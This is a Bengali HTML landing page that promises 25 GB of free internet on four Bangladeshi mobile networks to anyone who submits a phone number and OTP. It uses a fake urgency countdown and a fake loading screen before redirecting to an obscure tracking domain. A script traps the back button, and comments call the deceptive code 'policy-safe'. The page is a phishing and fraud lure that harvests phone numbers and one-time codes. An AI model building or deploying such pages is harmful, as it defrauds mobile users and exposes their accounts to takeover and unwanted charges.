<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Internet Offer</title>

<style>
html, body {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
}

body {
  min-height: 100vh;
  background: url("bg.jpg") no-repeat center center;
  background-size: cover;
  font-family: Arial, sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
}

/* Card */
.container {
  width: 92%;
  max-width: 420px;
  background: rgba(255,255,255,0.88);
  border-radius: 16px;
  padding: 22px;
  text-align: center;
  box-shadow: 0 10px 25px rgba(0,0,0,.22);
}

h1 {
  font-size: 22px;
  margin: 0 0 8px;
}

p {
  margin: 6px 0 12px;
  color: #333;
}

.timer {
  font-size: 26px;
  font-weight: bold;
  color: #e53935;
  margin: 8px 0 18px;
}

.btn {
  display: block;
  padding: 14px;
  margin: 10px 0;
  border-radius: 10px;
  color: #fff;
  text-decoration: none;
  font-weight: bold;
  font-size: 16px;
}

.gp { background:#2ecc71; }
.bl { background:#2980b9; }
.rb { background:#c0392b; }
.at { background:#e91e63; }

.note {
  font-size: 12px;
  color: #666;
  margin-top: 10px;
}

/* Loader (policy-safe) */
#loader {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,.6);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 9999;
}

.loader-box {
  background: #fff;
  border-radius: 12px;
  padding: 22px 26px;
  text-align: center;
  width: 80%;
  max-width: 300px;
}

.spinner {
  width: 36px;
  height: 36px;
  border: 4px solid #ddd;
  border-top: 4px solid #3498db;
  border-radius: 50%;
  margin: 0 auto 12px;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}
</style>
</head>

<body>

<!-- Loader -->
<div id="loader">
  <div class="loader-box">
    <div class="spinner"></div>
    <b>প্রসেসিং...</b><br>
    অনুগ্রহ করে অপেক্ষা করুন
  </div>
</div>

<div class="container">
  <h1>সীমিত সময়ের জন্য অফার</h1>
  <p>সকল সিমে পাচ্ছেন ফ্রি ইন্টারনেট</p>

  <div class="timer" id="timer">00:30:00</div>

  <!-- Buttons -->
  <a href="#" class="btn gp" data-link="https://fpqlxdu.com/cl/41bc73b46a4c3d28">
    গ্রামীণফোন 25 জিবি ফ্রি ইন্টারনেট
  </a>

  <a href="#" class="btn bl" data-link="https://fpqlxdu.com/cl/03dfbc5e731c26e2">
    বাংলালিংক 25 জিবি ফ্রি ইন্টারনেট
  </a>

  <a href="#" class="btn rb" data-link="https://fpqlxdu.com/cl/03dfbc5e731c26e2">
    রবি 25 জিবি ফ্রি ইন্টারনেট
  </a>

  <a href="#" class="btn at" data-link="https://fpqlxdu.com/cl/2e757d17274efb01">
    এয়ারটেল 25 জিবি ফ্রি ইন্টারনেট
  </a>

  <div class="note">
    * ফোন নাম্বার দিয়ে OTP দিলেই পাচ্ছেন ফ্রি ইন্টারনেট। মেয়াদ ৩০ দিন।
  </div>
</div>

<script>
/* Countdown (safe) */
let t = 1800;
setInterval(() => {
  if (t <= 0) return;
  t--;
  const m = String(Math.floor(t/60)).padStart(2,'0');
  const s = String(t%60).padStart(2,'0');
  document.getElementById('timer').innerText = `00:${m}:${s}`;
}, 1000);

/* Loading + delay redirect (policy-safe) */
document.querySelectorAll('.btn').forEach(b=>{
  b.addEventListener('click', e=>{
    e.preventDefault();
    const link = b.getAttribute('data-link');
    document.getElementById('loader').style.display='flex';
    setTimeout(()=>{ window.location.href = link; }, 2200);
  });
});

/* Back button – SAFE handling */
(function(){
  history.replaceState(null,null,location.href);
  window.addEventListener('popstate', ()=>{
    history.replaceState(null,null,location.href);
  });
})();
</script>

</body>
</html>
